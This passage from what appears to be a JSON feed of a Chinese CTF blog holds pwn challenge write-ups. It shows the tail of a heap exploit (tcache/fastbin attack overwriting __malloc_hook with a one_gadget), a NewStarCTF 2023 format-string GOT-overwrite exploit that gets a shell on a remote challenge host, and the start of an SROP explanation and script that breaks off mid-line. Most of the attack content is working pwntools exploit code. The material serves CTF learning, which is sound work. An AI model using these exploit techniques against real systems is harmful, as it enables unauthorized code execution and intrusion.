punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'the content: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token keyword\">not</span> <span class=\"token string\">b'forbidden'</span> <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'1.Create Slot'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">printcont</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa60'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x460</span><span class=\"token operator\">//</span><span class=\"token number\">0x70</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>    <span class=\"token comment\">#4 - 12</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa70'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#13</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x81'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#14-0</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x461</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#15-1</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x1f</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'b'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#16-1</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>printcont<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'ab'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>mainarena_96 <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mainarena_96 <span class=\"token operator\">-</span> <span class=\"token number\">0x1ecbe0</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the libcbase is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>libcbase<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">if</span> isremote <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    onegadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xe3b01</span> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    onegadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xe3b31</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>freehook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>   </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>mallochook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the freehook is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>freehook<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the malloc_hook is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mallochook<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the one_gadget is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>onegadget<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>fakechunk0 <span class=\"token operator\">=</span> mallochook <span class=\"token operator\">-</span> <span class=\"token number\">0x30</span> <span class=\"token operator\">-</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>payload0 <span class=\"token operator\">=</span> <span class=\"token string\">b'\\0'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x3</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>onegadget<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>   <span class=\"token comment\">#4-10 7->tcache 0x7</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    free<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#18-1</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#fastbin -> 2</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"81\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>fakechunk0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#19-1</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'cc70'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token comment\"># tcache -> 2 -> fake</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'cc'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">#from fastbin    #2</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>mal<span class=\"token punctuation\">(</span>payload0<span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'size: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "heap",
                "tcache",
                "double free",
                "fastbin attack",
                "chunk_extend_and_overlapping",
                "one_gadget",
                "malloc_hook",
                "free_hook"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/10/newstarctf2023-week3/",
            "url": "http://waltcsz.github.io/2023/10/newstarctf2023-week3/",
            "title": "newstarctf2023_week3",
            "date_published": "2023-10-15T05:32:08.000Z",
            "content_html": "<h1 id=\"puts-or-system\"><a class=\"markdownIt-Anchor\" href=\"#puts-or-system\">#</a> puts or system?</h1>\n<p>format_string 修改 got<br>\n 存在 printf 格式化漏洞，并且有个 <code>puts(&quot;/bin/sh&quot;);</code> 。只要把 puts 的 got 表值修改为 system 函数的真实值或者 plt 值，就可以 getshell。<br>\n经调试，printf 的第 9 个参数（%8p）为0x7fffffffdc90处的值。即输入的buf的内容。由此构造payload，在对应第10个参数处写入`__libc_start_main`的got地址，利用`%9s <code>泄露其真实地址。 随后拿到</code>  system <code>的真实地址，利用</code>  fmtstr_payload` 替换 puts 的 got 表内容。其中 offset 为 8，表示第 9 个参数为字符串内容。<br>\n<img data-src=\"./1697300307145-18099e4a-e4b7-4826-948a-c9044e3dacb7.png\" alt=\"image.png\"><br>\n<img data-src=\"./1697300269029-de9586b7-638c-498d-a780-35530e2e7d3b.png\" alt=\"image.png\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29924</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=process('./putsorsys_pe')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b printf')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./putsorsys'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>puts_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">ready</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Give me some gift?(0/1)\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    payload0 <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span> n<span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'What\\'s it\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%9$sb'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Oh thanks,There is my gift:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'ba'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>puts_g<span class=\"token punctuation\">:</span> sys_a<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> write_size<span class=\"token operator\">=</span><span class=\"token string\">'byte'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x300</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./1697300731337-eaf1d9d4-06d2-4873-9f77-6b47dc2ed85c.png\" alt=\"成功getshell\"></p>\n<h1 id=\"srop\"><a class=\"markdownIt-Anchor\" href=\"#srop\">#</a> srop</h1>\n<p>srop<br>\n 内核向进程发送 signal 机制后，该进程会被挂起，所有寄存器信息会被压入栈中，以及压入 signal 信息，指向 sigreturn 的系统调用地址，以上这一块成为 signal frame。然后会跳转 signal handler 中处理相应的 signal，执行完毕后会执行 sigreturn 代码。<br>\n而漏洞利用机制就是，往栈中压入伪造的 signal frame，然后在栈顶放入 sigreturn 的系统调用，便可以将所有寄存器设置为我们想要的值，包括 rip 指令寄存器。伪造 signal frame 可以利用 pwntools 的工具，可以直接设定需要的寄存器值。<br>\n在这题中，用了一个 <code>syscall</code>  的库函数来实现系统调用。因此代码中没有 syscall 汇编。而这个函数的第一个参数为系统调用号，其后的参数为正常系统调用时所用到的参数。如 <code>syscall(1,1,buf,48);</code>  相当于 <code>write(1,buf,48);</code>  的系统调用。<br>\n<img data-src=\"./1697301360023-4086385e-69d4-4b03-abde-7325fae5ed04.png\" alt=\"image.png\"><br>\n 其中伪造的 signal frame 中必须设置 rsp 的值，否则为 0。由于事先无法获取 rsp 地址和其他栈地址，且没有 <code>&quot;/bin/sh&quot;</code>  字符串，无法一次 sigreturn 实现 getshell。</p>\n<p>取一段.bss 段上可读写的地址，这里取了 <code>data=0x404100</code> 。因此在第一次栈溢出构造的 signal frame 中，调用 read 函数往 data 中继续伪造下一个 signal frame，并且 rsp 设置为 data，以继续在其中构造 payload。<br>\n因为用的 syscall 函数，所以 rdi 为系统调用号，read 的系统调用号为 0。rsi, rdx, rcx 分别为 read 的 3 个参数，为 0, data, 0x400。rip 设为 syscall 的 plt 地址。以便在执行 sigreturn 后接上 read 的系统调用。<br>\n在 signal frame 紧接的低地址处，放入 syscall 函数的 plt 地址和 rdi_ret 传参。sigreturn 对应的系统调用号为 0xf。</p>\n<p>第二个 signal frame 为 <code>execve(&quot;/bin/sh&quot;,0,0);</code>  的调用。这里把前面的 payload 补齐 0x120 字符后放入 <code>&quot;/bin/sh&quot;</code>  字符串，因此 rsi 的值应为 <code>buf+0x120</code> 。rsp 继续设为 data，防止调用 system 中途出现意外。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',25998)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn_1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b syscall')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>e <span 